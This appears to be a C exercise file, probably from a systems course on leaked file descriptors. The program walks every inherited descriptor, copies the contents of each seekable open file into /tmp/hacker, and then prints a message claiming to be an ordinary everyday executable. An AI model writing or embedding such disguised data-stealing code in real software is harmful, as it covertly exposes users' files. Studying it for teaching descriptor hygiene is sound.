#include "csapp.h"

int main(void) 
{
    long max_fd = sysconf(_SC_OPEN_MAX);
    int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

    /* TODO: Something is missing here! */
    const int buf_size = 1024;
    char buf1[buf_size];
    char buf2[buf_size];
    char path[buf_size];

    for (int i = 0; i < max_fd; i++)
    {
        if (lseek(i, 0, 0) >= 0)
        {
            snprintf(path, buf_size, "/proc/self/fd/%d", i);

            int path_len;

            if ((path_len = Readlink(path, buf1, buf_size)) < 0)
            {
                fprintf(stderr, "readlink failure!");
                exit(1);
            }

            buf1[path_len] = '\0';
            const int out_len = snprintf(
                buf2, 
                buf_size, 
                "File descriptor %d is '%s' file!\n", 
                i, 
                buf1
            );

            Write(out, buf2, out_len);

            char c;
            while (read(i, &c, 1) > 0)
                Write(out, &c, 1);
        }
    }
    
    Close(out);

    printf("I'm just a normal executable you use on daily basis!\n");

    return 0;
}
